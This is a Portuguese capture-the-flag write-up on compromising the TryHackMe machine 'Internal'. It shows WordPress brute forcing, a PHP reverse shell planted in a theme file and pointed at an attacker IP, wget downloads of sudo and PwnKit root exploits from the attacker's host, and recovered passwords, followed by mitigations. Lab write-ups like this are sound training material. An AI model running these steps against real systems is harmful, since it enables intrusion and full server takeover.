# 📄 RELATÓRIO TÉCNICO – CTF INTERNAL (TryHackMe)

👤 **Autor:** c0rt3s
🎯 **Plataforma:** TryHackMe
🖥️ **Máquina:** Internal
📌 **Tipo:** CTF – Web / Linux / Privilege Escalation
⚙️ **Objetivo:** Obter as flags da máquina
📊 **Nível de dificuldade:** Difícil
🧠 **Base de estudo:** Conteúdo e metodologia do curso da Desec Security

---

# 🎯 Objetivo do Lab

O objetivo deste laboratório foi comprometer a máquina *Internal* da plataforma TryHackMe e obter as flags presentes no sistema, aplicando técnicas de reconhecimento, enumeração web, exploração de WordPress, obtenção de shell reversa e escalonamento de privilégios em ambiente Linux.

A máquina foi escolhida como forma de validar, na prática, os conhecimentos adquiridos durante os estudos na Desec Security.

---

# ⚔️ Resumo da Cadeia de Ataque

A exploração da máquina seguiu o seguinte fluxo:

```
Reconhecimento de portas
        ↓
Enumeração de diretórios
        ↓
Identificação de WordPress
        ↓
Força bruta de credenciais
        ↓
Acesso ao painel admin
        ↓
Upload de reverse shell
        ↓
Acesso como www-data
        ↓
Enumeração local
        ↓
Exploração PwnKit
        ↓
Acesso root
        ↓
Captura das flags
```

Esse fluxo representa uma **kill chain clássica de exploração em ambientes Linux com aplicação web exposta**.

---

# 🔍 Reconhecimento Inicial – Enumeração de Portas

O primeiro passo foi identificar os serviços expostos no alvo utilizando **Nmap**.

```
sudo nmap -sS -Pn -n --min-rate 1000 -p- 10.64.185.77
```

O scan identificou as seguintes portas abertas:

* 22 (SSH)
* 80 (HTTP)

A presença da porta 80 indicava um serviço web ativo, que passou a ser o foco inicial da exploração.

---

# 🌐 Enumeração Web – Gobuster

Ao acessar o serviço HTTP foi encontrada a página padrão do Apache.

Para identificar diretórios ocultos foi utilizado **Gobuster**.

```
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt -a "Mozilla 5.1"
```

Durante a enumeração foram encontrados diretórios relevantes:

* `/blog`
* `/phpmyadmin`
* `/wordpress`
* `/javascript`

O diretório **/blog** indicava a presença de um site WordPress.

---

# 🔐 Enumeração do WordPress

Para analisar o WordPress foi utilizada a ferramenta **WPScan**.

```
wpscan --url http://internal.thm/blog --enumerate u,ap
```

Foram obtidas as seguintes informações:

* WordPress versão **5.4.2**
* XML-RPC habilitado
* usuário identificado: **admin**

---

# 🔓 Ataque de Força Bruta – WordPress

Com o usuário identificado foi realizado brute force utilizando a wordlist **rockyou**.

```
wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Credenciais encontradas:

Usuário: **admin**
Senha: **my2boys**

Isso permitiu acesso ao painel administrativo do WordPress.

---

# 🧨 Exploração – Reverse Shell via WordPress

Após acessar o painel administrativo do WordPress, foi utilizado o **Editor de Aparência** para modificar arquivos do tema ativo.

O arquivo selecionado foi:

```
archive.php
```

No lugar do conteúdo original foi inserido o conteúdo completo do script **php-reverse-shell**, disponível no Kali Linux.

Local do script no Kali:

```
/usr/share/webshells/php/php-reverse-shell.php
```

Antes de utilizá-lo foi necessário editar o script para configurar o IP da máquina atacante e a porta que receberia a conexão.

Trecho alterado no script:

```
$ip = '192.168.145.249';
$port = 4444;
```

Após inserir o código no arquivo `archive.php`, foi iniciado um listener na máquina atacante utilizando Netcat.

```
nc -nlvp 4444
```

Em seguida o arquivo modificado foi acessado pelo navegador:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/archive.php
```

Ao executar o arquivo no servidor web, o script estabeleceu uma conexão reversa com a máquina atacante, concedendo acesso ao sistema como o usuário **www-data**.

---

# 🐚 Acesso Inicial ao Sistema

Após obter a shell reversa, foi realizada a estabilização da TTY para melhorar a interação com o terminal.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Com a shell estabilizada iniciou-se o processo de **enumeração local do sistema**.

Foi realizada uma busca por possíveis arquivos de flag:

```
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
```

Os arquivos foram encontrados, porém não era possível acessá-los devido à falta de permissões.

Também foi identificado o diretório:

```
/home/aubreanna
```

Entretanto, o acesso a esse diretório também era restrito ao usuário root.

---

# 🔎 Enumeração do Sistema

Durante a enumeração foram analisados arquivos de configuração do WordPress.

```
cat /var/www/html/wordpress/wp-config.php
```

Nesse arquivo foram encontradas credenciais do banco de dados MySQL:

```
DB_NAME: wordpress
DB_USER: wordpress
DB_PASSWORD: wordpress123
```

Essas credenciais permitiram acesso ao banco de dados, porém não forneceram novas informações úteis para a escalada de privilégios.

A investigação continuou com a verificação de versões de binários do sistema.

---

# 🚀 Escalonamento de Privilégio

Durante a enumeração foram verificadas versões de binários potencialmente vulneráveis.

```
sudo --version
```

Resultado:

```
sudo 1.8.21p2
```

Essa versão é vulnerável à falha conhecida como:

**CVE-2021-3156**

Também foi analisada a versão do `pkexec`:

```
pkexec --version
```

Resultado:

```
pkexec version 0.105
```

Essa versão é vulnerável à falha:

**PwnKit (CVE-2021-4034)**

---

## Tentativa de exploração – Baron Samedit

Inicialmente foi tentada a exploração da vulnerabilidade do sudo.

Exploit utilizado:

```
https://github.com/blasty/CVE-2021-3156.git
```

Na máquina atacante foi iniciado um servidor HTTP:

```
python3 -m http.server 80
```

Na máquina alvo foi realizado o download:

```
wget http://192.168.145.249/sudo-hax-me-a-sandwich-static
```

Permissão de execução:

```
chmod +x sudo-hax-me-a-sandwich-static
```

Execução:

```
./sudo-hax-me-a-sandwich-static
```

Entretanto, essa exploração **não resultou em escalonamento de privilégio**.

---

## Exploração bem-sucedida – PwnKit

Após a tentativa anterior falhar, foi utilizado o exploit da vulnerabilidade PwnKit.

Exploit utilizado:

```
https://github.com/ly4k/PwnKit.git
```

Download na máquina alvo:

```
cd /tmp
wget http://192.168.145.249/PwnKit
chmod +x PwnKit
```

Execução do exploit:

```
./PwnKit
```

Após a execução foi aberta uma nova shell com privilégios elevados.

Confirmação:

```
whoami
```

Resultado:

```
root
```

---

# 🔓 Acesso Root e Captura das Flags

Após obter privilégios de root foi possível acessar diretórios anteriormente restritos.

Primeiramente foi acessado:

```
/home/aubreanna
```

Onde foi encontrada a **flag de usuário**:

```
user.txt
```

Em seguida foi acessado:

```
/root
```

Onde foi encontrada a **flag final**:

```
root.txt
```

---

# ⚠️ Observação Importante

Durante a pesquisa posterior à resolução da máquina foi identificado que **existe também uma outra abordagem possível de exploração envolvendo o serviço Jenkins executando dentro de um container Docker interno**.

Essa técnica utiliza acesso ao serviço Jenkins para obter execução de comandos dentro do container e posteriormente realizar movimentação lateral.

Entretanto, essa abordagem **não foi utilizada durante a resolução deste laboratório**, sendo descoberta apenas após análise de outros materiais e write-ups.

---

# 💥 Impacto de Segurança

Caso essas vulnerabilidades estivessem presentes em um ambiente real, um atacante poderia:

* comprometer o CMS corporativo
* obter execução remota de código no servidor web
* acessar serviços internos
* escalar privilégios até root
* comprometer completamente o servidor

Isso poderia resultar em **comprometimento total da infraestrutura afetada**.

---

# 🛡️ Mitigações Recomendadas

Algumas medidas que poderiam prevenir essa exploração incluem:

* Atualização do WordPress para versões mais recentes
* Implementação de proteção contra brute force
* Restrição do editor de temas do WordPress
* Atualização do pacote **polkit**
* Atualização do **sudo**
* Monitoramento de acessos administrativos

---

# 🧠 Conclusão

Este laboratório demonstrou a importância de uma metodologia estruturada de pentest. A máquina apresentou diversas vulnerabilidades exploráveis:

* WordPress vulnerável a ataques de força bruta
* Possibilidade de execução de código através da edição de arquivos do tema
* Sistema vulnerável a escalonamento de privilégios via **PwnKit**

A conclusão bem-sucedida deste CTF reforça a eficácia da metodologia aplicada e demonstra na prática os conhecimentos adquiridos durante os estudos na Desec Security.

---
